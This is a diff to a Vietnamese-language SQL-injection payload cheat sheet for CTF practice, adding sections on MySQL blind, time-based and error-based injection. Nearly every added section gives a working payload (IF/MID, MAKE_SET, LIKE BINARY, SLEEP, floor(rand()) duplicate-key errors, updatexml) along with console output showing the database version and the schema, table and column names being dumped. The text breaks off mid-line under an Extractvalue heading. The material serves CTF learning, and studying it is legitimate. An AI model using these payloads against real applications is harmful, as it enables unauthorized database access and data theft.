@@ -2,6 +2,8 @@
 
 - Lưu ý 1 số payload mình sẽ giữ nguyên định dạng *query* gốc để các bạn hiểu rõ vấn đề, còn trong ctf thực tế bạn phải đoán được *query* của đề để cắt ghép sử dụng payload 
 - Không phải hàm nào mình cũng giải thích chức năng nên các bạn chịu khó *reseach* để tìm hiểu
+- Nên lưu ý đây là nơi mình tổng hợp các payload, nên đa số các payload mình thường không giải thích rõ, các bạn *research* chức năng của hàm rồi từ từ phân tích là sẽ hiểu
+- Tổng hợp 1 số hàm trong *Mysql*: [Link1](https://viblo.asia/p/cac-function-trong-mysql-phan-1-yMnKMnODZ7P) [Link2](https://viblo.asia/p/cac-function-trong-mysql-phan-2-GrLZDvD35k0)
 
 ---
 
@@ -329,6 +331,8 @@
 
   - Với *menu* là *table* và *xssuser* là *database*
 
+---
+
 ### 7. Mysql Blind
 
 - Mysql Blind được áp dụng khi *server* không trả về kết quả chính xác cho ta, nhưng vẫn trả về 1 giá trị nào đó
@@ -469,6 +473,230 @@
 
 - Đây là code mẫu của mình, tùy vào trường hợp mà chỉnh sửa các thông số. Mình sẽ không giải thích về tool này. Các bạn chịu khó *research* để tìm hiểu
 
-- To Be Continue ...
+- Sử dụng *IF*
 
-  
+  - Payload: 
+
+    ```mysql
+    select * from menu where id = 1 AND IF(MID(@@version,1,1)='1','a','b')='a';
+    ```
+
+    ```mysql
+    MariaDB [xssuser]> select * from menu where id = 1 AND IF(MID(@@version,1,1)='5','a','b')='a';
+    Empty set (0.00 sec)
+    
+    MariaDB [xssuser]> select * from menu where id = 1 AND IF(MID(@@version,1,1)='1','a','b')='a';
+    +----+-----------+
+    | ID | NAME_MENU |
+    +----+-----------+
+    |  1 | Menu 2    |
+    +----+-----------+
+    1 row in set (0.00 sec)
+    ```
+
+    
+
+- Sử dụng *MAKE_SET*
+
+  - Payload: 
+
+    ```mysql
+    select * from menu where id = 1 AND MAKE_SET(3<2,32);
+    ```
+
+    ```mysql
+    MariaDB [xssuser]> select * from menu where id = 1 AND MAKE_SET(31<(SELECT(length(version()))),1);
+    +----+-----------+
+    | ID | NAME_MENU |
+    +----+-----------+
+    |  1 | Menu 2    |
+    +----+-----------+
+    1 row in set (0.00 sec)
+    
+    MariaDB [xssuser]> select * from menu where id = 1 AND MAKE_SET(33<(SELECT(length(version()))),1);
+    Empty set, 5 warnings (0.00 sec)
+    ```
+
+  - Thực sự cách dùng *MAKE_SET* chính thức không phải vậy, tuy nhiên cũng coi như 1 *trick* nhỏ để sử dụng đề phòng 1 số hàm để so sánh như *IF* ,.. bị *filter*
+
+- Sử dụng *LIKE*
+
+  - Payload: 
+
+    ```mysql
+    select * from menu where id = 1 AND BINARY NAME_MENU LIKE 'M%'
+    ```
+
+    ```mysql
+    MariaDB [xssuser]> select * from menu where id = 1 AND NAME_MENU LIKE 'n%';
+    Empty set (0.00 sec)
+    
+    MariaDB [xssuser]> select * from menu where id = 1 AND NAME_MENU LIKE 'm%';
+    +----+-----------+
+    | ID | NAME_MENU |
+    +----+-----------+
+    |  1 | Menu 2    |
+    +----+-----------+
+    1 row in set (0.00 sec)
+    
+    MariaDB [xssuser]> select * from menu where id = 1 AND BINARY NAME_MENU LIKE 'm%';
+    Empty set (0.01 sec)
+    
+    MariaDB [xssuser]> select * from menu where id = 1 AND BINARY NAME_MENU LIKE 'M%';
+    +----+-----------+
+    | ID | NAME_MENU |
+    +----+-----------+
+    |  1 | Menu 2    |
+    +----+-----------+
+    1 row in set (0.00 sec)
+    ```
+
+  - Sử dụng *LIKE* tuy không phần biệt được chữ hoa và thường nhưng nếu kết hợp với *BINARY* thì sẽ phân biệt được
+
+---
+
+### 8. Mysql Time Based
+
+- *Time Based* và *Blind Based* thật sự không khác nhau là mấy, tuy nhiên đối với *Blind Based* thì vẫn có 1 kết quả đặc thù nào đó trả về, còn *Time  Based* không có bất cứ kết quả nào được trả về, tuy nhiên câu *query* ta vẫn phải hoạt động được
+
+- Sử dụng *SLEEP()* là cách kinh điển nhất của *Time Based* 
+
+  - Payload: 
+
+    ```mysql
+    select * from menu where id = 1 AND BINARY NAME_MENU LIKE 'M%' AND SLEEP(5)
+    ```
+
+    ```mysql
+    MariaDB [xssuser]> select * from menu where id = 1 AND BINARY NAME_MENU LIKE 'M%' AND SLEEP(5);
+    Empty set (5.00 sec)
+    ```
+
+  - Nếu bạn chạy *query* này thì sẽ thấy chúng bị ngừng 5s trước khi trả kết quả
+
+- Thật sự thì chỉ cần đem *Blind Based* kết hợp thêm *SLEEP* là thành *Time Based*, đa số là vậy
+
+---
+
+### 9. Mysql Error Based
+
+- Đây là kỹ thuật khiến *mysql* sinh lỗi và nhả ra thứ ta mong muốn
+
+- Lấy thông tin *database*
+
+  - Payload
+
+    ```mysql
+    select * from menu where id = '(select 1 and row(1,1)>(select count(*),concat(CONCAT(DATABASE()),0x3a,floor(rand()*2))x from (select 1 union select 2)a group by x limit 1))'+(select 1 and row(1,1)>(select count(*),concat(CONCAT(DATABASE()),0x3a,floor(rand()*2))x from (select 1 union select 2)a group by x limit 1))+''
+    ```
+
+    ```mysql
+    MariaDB [xssuser]> select * from menu where id = '(select 1 and row(1,1)>(select count(*),concat(CONCAT(DATABASE()),0x3a,floor(rand()*2))x from (select 1 union select 2)a group by x limit 1))'+(select 1 and row(1,1)>(select count(*),concat(CONCAT(DATABASE()),0x3a,floor(rand()*2))x from (select 1 union select 2)a group by x limit 1))+'';
+    ERROR 1062 (23000): Duplicate entry 'xssuser:1' for key 'group_key'
+    ```
+
+- Lấy thông tin của *version*
+
+  - Payload:
+
+    ```mysql
+    select * from menu where id = '(select 1 and row(1,1)>(select count(*),concat(CONCAT(@@VERSION),0x3a,floor(rand()*2))x from (select 1 union select 2)a group by x limit 1))'+(select 1 and row(1,1)>(select count(*),concat(CONCAT(@@VERSION),0x3a,floor(rand()*2))x from (select 1 union select 2)a group by x limit 1))+'';
+    ```
+
+    ```mysql
+    MariaDB [xssuser]> select * from menu where id = '(select 1 and row(1,1)>(select count(*),concat(CONCAT(@@VERSION),0x3a,floor(rand()*2))x from (select 1 union select 2)a group by x limit 1))'+(select 1 and row(1,1)>(select count(*),concat(CONCAT(@@VERSION),0x3a,floor(rand()*2))x from (select 1 union select 2)a group by x limit 1))+'';
+    ERROR 1062 (23000): Duplicate entry '10.1.41-MariaDB-0ubuntu0.18.04.1:1' for key 'group_key'
+    ```
+
+- Sử dụng *UpdateXML function* để lấy thông tin, sau đây là 1 vài *payload* để *dump data*
+
+  - Payload 1:
+
+    ```mysql
+    select * from menu where id = 1 AND updatexml(rand(),concat(CHAR(126),version(),CHAR(126)),null);
+    ```
+
+    ```mysql
+    MariaDB [xssuser]> select * from menu where id = 1 AND updatexml(rand(),concat(CHAR(126),version(),CHAR(126)),null);
+    ERROR 1105 (HY000): XPATH syntax error: '~10.1.41-MariaDB-0ubuntu0.18.04.'
+    ```
+
+  - Lấy ra thông tin của *version*
+
+  - Payload 2:
+
+    ```mysql
+    select * from menu where id = 1 AND updatexml(rand(),concat(0x3a,(SELECT concat(CHAR(126),schema_name,CHAR(126)) FROM information_schema.schemata LIMIT 4,1)),null);
+    ```
+
+    ```mysql
+    MariaDB [xssuser]> select * from menu where id = 1 AND updatexml(rand(),concat(0x3a,(SELECT concat(CHAR(126),schema_name,CHAR(126)) FROM information_schema.schemata LIMIT 3,1)),null);
+    ERROR 1105 (HY000): XPATH syntax error: ':~sqlinjection~'
+    MariaDB [xssuser]> select * from menu where id = 1 AND updatexml(rand(),concat(0x3a,(SELECT concat(CHAR(126),schema_name,CHAR(126)) FROM information_schema.schemata LIMIT 4,1)),null);
+    ERROR 1105 (HY000): XPATH syntax error: ':~xssuser~'
+    ```
+
+  - Lấy ra tên của các *database*
+
+  - Payload 3:
+
+    ```mysql
+    select * from menu where id = 1 AND updatexml(rand(),concat(0x3a,(SELECT concat(CHAR(126),TABLE_NAME,CHAR(126)) FROM information_schema.TABLES WHERE table_schema='xssuser' LIMIT 0,1)),null)
+    ```
+
+    ```mysql
+    MariaDB [xssuser]> select * from menu where id = 1 AND updatexml(rand(),concat(0x3a,(SELECT concat(CHAR(126),TABLE_NAME,CHAR(126)) FROM information_schema.TABLES WHERE table_schema='xssuser' LIMIT 0,1)),null);
+    ERROR 1105 (HY000): XPATH syntax error: ':~menu~'
+    MariaDB [xssuser]> select * from menu where id = 1 AND updatexml(rand(),concat(0x3a,(SELECT concat(CHAR(126),TABLE_NAME,CHAR(126)) FROM information_schema.TABLES WHERE table_schema='xssuser' LIMIT 1,1)),null);
+    ERROR 1105 (HY000): XPATH syntax error: ':~user~'
+    ```
+
+  - Lấy ra tên của các *table* dựa trên *database*
+
+  - Payload 4:
+
+    ```mysql
+    select * from menu where id = 1 AND updatexml(rand(),concat(0x3a,(SELECT concat(CHAR(126),column_name,CHAR(126)) FROM information_schema.columns WHERE TABLE_NAME='menu' LIMIT 0,1)),null)
+    ```
+
+    ```mysql
+    MariaDB [xssuser]> select * from menu where id = 1 AND updatexml(rand(),concat(0x3a,(SELECT concat(CHAR(126),column_name,CHAR(126)) FROM information_schema.columns WHERE TABLE_NAME='menu' LIMIT 0,1)),null);
+    ERROR 1105 (HY000): XPATH syntax error: ':~ID~'
+    MariaDB [xssuser]> select * from menu where id = 1 AND updatexml(rand(),concat(0x3a,(SELECT concat(CHAR(126),column_name,CHAR(126)) FROM information_schema.columns WHERE TABLE_NAME='menu' LIMIT 1,1)),null);
+    ERROR 1105 (HY000): XPATH syntax error: ':~NAME_MENU~'
+    ```
+
+  - Lấy ra tên các *column* dựa trên các *table*
+
+- Có thể rút gọn các *payload* thành
+
+  - Payload:
+
+    ```mysql
+    select * from menu where id = 1 AND updatexml(null,concat(0x0a,version()),null)
+    ```
+
+    ```mysql
+    MariaDB [xssuser]> select * from menu where id = 1 AND updatexml(null,concat(0x0a,version()),null);
+    ERROR 1105 (HY000): XPATH syntax error: '
+    10.1.41-MariaDB-0ubuntu0.18.04.'
+    ```
+
+  - Payload:
+
+    ```mysql
+    select * from menu where id = 1 AND updatexml(null,concat(0x0a,(select table_name from information_schema.tables where table_schema=database() LIMIT 0,1)),null)
+    ```
+
+    ```mysql
+    MariaDB [xssuser]> select * from menu where id = 1 AND updatexml(null,concat(0x0a,(select table_name from information_schema.tables where table_schema=database() LIMIT 0,1)),null);
+    ERROR 1105 (HY000): XPATH syntax error: '
+    menu'
+    MariaDB [xssuser]> select * from menu where id = 1 AND updatexml(null,concat(0x0a,(select table_name from information_schema.tables where table_schema=database() LIMIT 1,1)),null);
+    ERROR 1105 (HY000): XPATH syntax error: '
+    user'
+    ```
+
+- Sử dụng *Extractvalue function*
+
+- T
